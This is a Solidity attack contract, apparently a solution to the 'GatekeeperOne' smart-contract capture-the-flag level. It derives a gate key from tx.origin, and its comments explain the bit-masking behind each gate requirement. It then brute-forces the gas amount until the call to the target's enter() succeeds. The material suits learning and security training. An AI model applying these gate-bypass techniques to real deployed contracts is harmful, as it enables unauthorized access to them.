//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract GxT{
    address target;

    constructor(address t){
        target=t;
    }

    function buildKey() public view returns(bytes8) {
        //we have 3 requirements for the key: 
        /*require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        
        the key has to be 64 bits following a pattern:
        32bits||16bits||16bits
        requirement1 => has to have the 16 bits in the middle 0x00 => so that when casted to uint32 yields the same value as when casted to uint16 
        example:    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx xx 
        in this case regardless of the cast the value will be consisted of the least significant 16 bits

        requirement2 => the most significant 32 bits have to have at least one non-zero bit so that when taken into consideration the value changes

        requirement3 => the last 16bits have to be the last 16bits of the EOA account that calls the txn

        the final key would look like this:
        most significant 32bits - anything with the condition that at least one is not zero
        middle 16bits - all 0x00
        least significant 16bits - the last 16bits of my EOA account address
        */

        uint16 partOne = uint16(uint160(tx.origin)); //take the last 2bytes from the EOA address
        uint32 partTwo = uint32(partOne); //padding 16 null bits
        uint64 partialKey = uint64(partTwo); //padding 32 more null bits
        uint64 key = partialKey | 0xAAAAAAAA_00000000; //OR operation - making the most significant 4bytes 0xAAAAAAAA

        return bytes8(key);
    }

    function attack() public returns(bool){
        bytes8 key = buildKey();

        for(uint i = 0; i<8191;i++){
            //I call the fct with three times the amount of gas because there are setup costs that the EVM requires
            //I do not know how much gas will be consumed until the require() inside the 2nd gate gets executed
            //this is why I have this loop that increments the gas value at every iteration and exits only when the call works
            //meaning the gas value that is a multiple of 8191 is found 
            (bool ok, ) = target.call{gas: 8191*3+i}(abi.encodeWithSignature("enter(bytes8)", key));

            if(ok) return true;
        }
    }

}
